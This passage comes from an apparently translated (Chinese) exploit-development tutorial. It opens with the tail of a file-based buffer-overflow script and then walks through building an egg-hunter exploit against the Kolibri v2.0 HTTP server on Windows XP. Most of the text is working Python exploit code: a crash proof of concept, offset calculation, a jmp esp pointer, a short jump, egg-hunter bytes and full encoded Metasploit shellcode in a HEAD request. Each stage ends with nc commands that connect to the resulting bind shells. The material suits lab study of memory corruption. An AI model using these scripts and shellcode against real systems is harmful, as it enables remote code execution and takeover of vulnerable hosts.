c3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"  
evil = "\x90"*20 + buf  
buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + evil + "B"*(1384-len(evil))  
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  现在使用脚本生成有效载荷文件。

1.  在调试器中运行应用程序并加载有效载荷。

1.  现在我们可以运行`nc`命令连接到系统：

```py
nc -nv 192.168.1.37 4444  
```

# Egg hunters

在缓冲区溢出中，我们劫持执行流并重定向到包含我们缓冲区一部分和该缓冲区中的指令的 CPU 寄存器。但是，如果缓冲区大小非常小，我们无法注入任何有效载荷。因此，我们无法利用这个漏洞。在这种情况下，我们必须检查两种可能的选项。首先检查 EIP 寄存器被覆盖之前缓冲区的位置是否位于内存中。另一个选项是内存中不同区域的缓冲区段，附近的缓冲区段，以便我们可以跳转到偏移量。

使用一组指令创建了一个 egg hunter，这些指令被翻译成操作码。因此，egg hunters 可以用于搜索整个内存范围，包括堆栈和堆，以查找最终阶段的 shell 代码，并将执行流重定向到 shell 代码。

Egg hunters 包括一个用户定义的四字节标记，它将用于在内存中搜索，直到找到这个标记重复两次为止。当它找到标记时，它将重定向执行流到标记后面，我们的 shell 代码所在的地方。

# 准备就绪

我们需要另一个应用程序来演示创建利用的方法。在这里，我们使用 Kolibri v2.0 HTTP 服务器。可以从以下网址下载：[`rejahrehim.com/assets/sample-package/Kolibri_sample.zip`](https://rejahrehim.com/assets/sample-package/Kolibri_sample.zip)。

我们的受害机是一个 Windows XP 32 位机器。确保在其中安装了带有`mona.py`的 Immunity Debugger。

# 如何做...

以下是使用 egg hunters 生成利用脚本的步骤：

1.  我们必须创建一个新的利用文件。因此创建`kolibri_exploit.py`并在编辑器中打开它。

1.  我们可以从向服务器提交一个大缓冲区开始。因此添加以下代码。确保使用正确的 IP 地址更新 IP 地址为您的易受攻击机器的正确 IP 地址：

```py
#!/usr/bin/python   
import socket 
import os 
import sys   
buff = "A"*600   
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  使用调试器打开易受攻击的应用程序，选择`kolibri.exe`。

1.  然后运行我们创建的利用脚本：

```py
python kolibri_exploit.py
```

这将像往常一样使应用程序崩溃：

![](img/00106.jpeg)

1.  然后用模式更改`A`缓冲区。我们可以使用模式生成器创建一个模式。用模式更新代码。我们的脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  重新启动应用程序并再次运行脚本。这也将使应用程序崩溃。然后使用`mona`获取有关寄存器的详细信息。为此，在 Immunity Debugger 控制台中提供以下命令：

```py
!mona findmsp  
```

![](img/00107.gif)

从中我们可以确定在 515 字节后 EIP 可以被四个字节覆盖

1.  根据信息，我们可以更新缓冲区如下：

```py
buf = "A"*515 + [EIP] + "B"*81     
```

1.  现在我们可以获取一个地址，将执行流程重定向到 ESP 寄存器。为此，我们可以使用`mona.py`：

```py
!mona jmp -r esp     
```

![](img/00108.jpeg)

我们可以从中选择一个指针，并将其放置在我们的缓冲区中。我们可以选择以下指针：

```py
0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)  
```

此外，我们将在缓冲区中放置 egg hunter，并进行短跳转。为此，我们必须在最后包含短跳转的操作码。因此，相应地更新缓冲区，包括指针和短跳转的操作码。短跳转的操作码可以计算如下。短跳转操作码以`\xEB`开头，后面跟着我们需要跳转的距离。这里我们需要向后跳转 60 个字节。

因此，使用计算器将-60 十进制转换为十六进制：

![](img/00109.jpeg)![](img/00110.jpeg)

1.  现在，结合这两者，操作码将如下所示：`\xEB\xC4`

1.  现在，我们的脚本将如下所示：

```py
#!/usr/bin/python  
import socket 
import os 
import sys 
buff = "A"*515 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在重新启动应用程序和调试器，再次运行脚本。通过这个执行，流程将从 EIP 重定向到 ESP，因为 ESP 包含我们的短跳转，并且它将向后跳转 60 个字节，最终到达我们放置`A`缓冲区的区域：

![](img/00111.gif)

1.  现在我们可以使用`mona.py`生成一个 egg hunter，并将其包含在脚本中。

在 Immunity Debugger 控制台中发出以下命令，并复制生成的 egg hunter 代码：

```py
!mona help egg 
!mona egg -t b33f 
```

![](img/00112.gif)

1.  使用 egg hunter 代码更新脚本。现在我们的脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
hunter = ( 
"\x66\x81\xca\xff" 
"\x0f\x42\x52\x6a" 
"\x02\x58\xcd\x2e" 
"\x3c\x05\x5a\x74" 
"\xef\xb8\x62\x33" 
"\x33\x66\x8b\xfa"  
"\xaf\x75\xea\xaf" 
"\x75\xe7\xff\xe7")  
buff = "A"*478 + hunter + "A"*5 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在使用 Metasploit 生成 shell 代码，并将 shell 包含在脚本中，将 shell 代码推送到服务器。因此，我们的最终脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
hunter = ( 
"\x66\x81\xca\xff" 
"\x0f\x42\x52\x6a" 
"\x02\x58\xcd\x2e" 
"\x3c\x05\x5a\x74" 
"\xef\xb8\x62\x33" 
"\x33\x66\x8b\xfa"  
"\xaf\x75\xea\xaf" 
"\x75\xe7\xff\xe7")  
shellcode = ( 
"\xdb\xcf\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49\x49\x49" 
"\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58" 
"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42" 
"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c" 
"\x4a\x48\x6d\x59\x67\x70\x77\x70\x67\x70\x53\x50\x4d\x59\x4b" 
"\x55\x75\x61\x49\x42\x35\x34\x6c\x4b\x52\x72\x70\x30\x6c\x4b" 
"\x43\x62\x54\x4c\x4c\x4b\x62\x72\x76\x74\x6c\x4b\x72\x52\x35" 
"\x78\x36\x6f\x6e\x57\x42\x6a\x76\x46\x66\x51\x6b\x4f\x50\x31" 
"\x69\x50\x6c\x6c\x75\x6c\x35\x31\x53\x4c\x46\x62\x34\x6c\x37" 
"\x50\x6f\x31\x58\x4f\x74\x4d\x75\x51\x49\x57\x6d\x32\x4c\x30" 
"\x66\x32\x31\x47\x4e\x6b\x46\x32\x54\x50\x4c\x4b\x62\x62\x45" 
"\x6c\x63\x31\x68\x50\x4c\x4b\x61\x50\x42\x58\x4b\x35\x39\x50" 
"\x33\x44\x61\x5a\x45\x51\x5a\x70\x66\x30\x6c\x4b\x57\x38\x74" 
"\x58\x4c\x4b\x50\x58\x57\x50\x66\x61\x58\x53\x78\x63\x35\x6c" 
"\x62\x69\x6e\x6b\x45\x64\x6c\x4b\x76\x61\x59\x46\x45\x61\x39" 
"\x6f\x70\x31\x39\x50\x6c\x6c\x4f\x31\x48\x4f\x66\x6d\x45\x51" 
"\x79\x57\x46\x58\x49\x70\x50\x75\x39\x64\x73\x33\x61\x6d\x59" 
"\x68\x77\x4b\x53\x4d\x31\x34\x32\x55\x38\x62\x61\x48\x6c\x4b" 
"\x33\x68\x64\x64\x76\x61\x4e\x33\x43\x56\x4c\x4b\x44\x4c\x70" 
"\x4b\x6e\x6b\x51\x48\x35\x4c\x43\x31\x4b\x63\x4e\x6b\x55\x54" 
"\x6e\x6b\x47\x71\x48\x50\x4c\x49\x31\x54\x45\x74\x36\x44\x43" 
"\x6b\x43\x6b\x65\x31\x52\x79\x63\x6a\x72\x71\x39\x6f\x6b\x50" 
"\x56\x38\x33\x6f\x50\x5a\x4c\x4b\x36\x72\x38\x6b\x4c\x46\x53" 
"\x6d\x42\x48\x47\x43\x55\x62\x63\x30\x35\x50\x51\x78\x61\x67" 
"\x43\x43\x77\x42\x31\x4f\x52\x74\x35\x38\x70\x4c\x74\x37\x37" 
"\x56\x37\x77\x4b\x4f\x78\x55\x6c\x78\x4c\x50\x67\x71\x67\x70" 
"\x75\x50\x64\x69\x49\x54\x36\x34\x36\x30\x35\x38\x71\x39\x6f" 
"\x70\x42\x4b\x55\x50\x79\x6f\x4a\x75\x66\x30\x56\x30\x52\x70" 
"\x76\x30\x77\x30\x66\x30\x73\x70\x66\x30\x62\x48\x68\x6a\x54" 
"\x4f\x4b\x6f\x4b\x50\x79\x6f\x78\x55\x4f\x79\x59\x57\x75\x61" 
"\x6b\x6b\x42\x73\x51\x78\x57\x72\x35\x50\x55\x77\x34\x44\x4d" 
"\x59\x4d\x36\x33\x5a\x56\x70\x66\x36\x43\x67\x63\x58\x38\x42" 
"\x4b\x6b\x64\x77\x50\x67\x39\x6f\x4a\x75\x66\x33\x33\x67\x73" 
"\x58\x4f\x47\x4d\x39\x55\x68\x69\x6f\x49\x6f\x5a\x75\x33\x63" 
"\x32\x73\x53\x67\x42\x48\x71\x64\x6a\x4c\x47\x4b\x59\x71\x59" 
"\x6f\x5a\x75\x30\x57\x4f\x79\x78\x47\x61\x78\x34\x35\x30\x6e" 
"\x70\x4d\x63\x51\x39\x6f\x69\x45\x72\x48\x75\x33\x50\x6d\x55" 
"\x34\x57\x70\x6f\x79\x5a\x43\x43\x67\x71\x47\x31\x47\x54\x71" 
"\x5a\x56\x32\x4a\x52\x32\x50\x59\x66\x36\x58\x62\x39\x6d\x71" 
"\x76\x4b\x77\x31\x54\x44\x64\x65\x6c\x77\x71\x37\x71\x4c\x4d" 
"\x37\x34\x57\x54\x34\x50\x59\x56\x55\x50\x43\x74\x61\x44\x46" 
"\x30\x73\x66\x30\x56\x52\x76\x57\x36\x72\x76\x42\x6e\x46\x36" 
"\x66\x36\x42\x73\x50\x56\x65\x38\x42\x59\x7a\x6c\x67\x4f\x4e" 
"\x66\x79\x6f\x4a\x75\x4d\x59\x6b\x50\x62\x6e\x76\x36\x42\x66" 
"\x4b\x4f\x36\x50\x71\x78\x54\x48\x4c\x47\x75\x4d\x51\x70\x4b" 
"\x4f\x48\x55\x6f\x4b\x6c\x30\x78\x35\x6f\x52\x33\x66\x33\x58" 
"\x6c\x66\x4f\x65\x6f\x4d\x4f\x6d\x6b\x4f\x7a\x75\x75\x6c\x56" 
"\x66\x51\x6c\x65\x5a\x4b\x30\x79\x6b\x69\x70\x51\x65\x77\x75" 
"\x6d\x6b\x30\x47\x36\x73\x31\x62\x62\x4f\x32\x4a\x47\x70\x61" 
"\x43\x4b\x4f\x4b\x65\x41\x41")  
buff = "A"*478 + hunter + "A"*5 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
shell = "b33fb33f" + shellcode  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: " + shell + "\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在在调试器中重新启动应用程序并运行脚本进行利用。使用`nc`命令检查利用：

```py
nc -nv 192.168.1.37 9988  
```
